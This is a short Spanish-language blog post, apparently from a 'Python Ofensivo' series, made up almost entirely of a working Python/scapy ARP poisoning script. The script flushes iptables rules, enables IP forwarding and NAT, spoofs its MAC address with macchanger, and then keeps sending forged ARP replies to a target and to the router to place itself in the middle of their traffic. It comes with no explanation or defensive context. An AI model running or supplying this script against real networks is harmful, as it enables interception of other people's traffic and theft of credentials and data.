---
layout: single
title: ARP Poisoning - Python
excerpt: "ARP Poisoning (MITM Attack)."
date: 2025-03-16
classes: wide
header:
  teaser: /img2/images/python.jpg"
  teaser_home_page: true
  icon: /img2/python.ico
categories:
  - Python
  - Scripts
tags:
  - Python Ofensivo
  - MITM
---

```python
import os
import argparse
import subprocess
import scapy.all as scapy
import time
import signal
import sys
import uuid

from termcolor import colored


def def_handler(sig,frame): 
  print(colored(f"\n[!] Saliendo del programa...\n","red"))
  sys.exit(1)

signal.signal(signal.SIGINT, def_handler) 


def get_arguments(): 
  parser=argparse.ArgumentParser(description="ARP Spoofer")
  parser.add_argument("-t", "--target", required=True,dest="ip_address", help="Host / IP Range to Spoof")
  parser.add_argument("-r","--router", required=True,dest="ip_router",help="Router IP to Spoof")

  return parser.parse_args()


def root(): 
  if subprocess.check_output(["whoami"]).decode().strip() == 'root':
    return True


def requirements(): 
  os.system("iptables --flush")
  os.system("iptables --policy FORWARD ACCEPT")
  os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
  os.system("iptables -t nat -A POSTROUTING -o ens33 -j MASQUERADE")
  os.system("iptables -A FORWARD -i ens33 -j ACCEPT")
  os.system("macchanger ens33 -m aa:bb:cc:44:55:66 >/dev/null")


def spoof(ip_address,spoof_ip):

  arp_packet=scapy.ARP(op=2, psrc=spoof_ip, pdst=ip_address, hwsrc="aa:bb:cc:44:55:66") 
  scapy.send(arp_packet, verbose=False)

def main():
  if root():
    requirements()
    arguments=get_arguments()
    while True: 
      spoof(arguments.ip_address, arguments.ip_router)
      spoof(arguments.ip_router, arguments.ip_address)
      time.sleep(2) 
  else:
    print(colored("\n[!] Este script necesita ser ejecutado por el usuario root.","red"))


if __name__=='__main__':
  main()
```